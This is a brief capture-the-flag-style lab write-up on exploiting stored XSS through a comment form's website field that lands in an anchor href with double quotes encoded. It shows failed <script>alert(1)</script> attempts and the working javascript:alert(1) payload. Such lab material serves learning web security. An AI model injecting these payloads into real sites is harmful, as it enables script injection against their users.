# Stored XSS into anchor href attribute with double quotes HTML-encoded

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal - 

Exploit stored XSS vulnerability to call the alert function

### Analysyis/Exploitation

![](./images/99de67491d5b_001.png)

![](./images/99de67491d5b_002.png)

after posting comment we can see that the url which we put in  website section is appearing in href 

instead of url we can insert script here

I tried to insert 

```javascript
<script>alert(1)</script>
"<script>alert(1)</script>
```

and when i clicked on comment they just get append at the end of our lab url and script didn’t work

![](./images/99de67491d5b_003.png)

### How to call javascript from a href

```javascript
<a href="#" onclick="myFunction()" >LinkText</a>
or
<a href="javascript:call_func();">...</a>
```

We can't use first one because double quotes are encode so we use 2nd method

```javascript
javascript:alert(1)
```
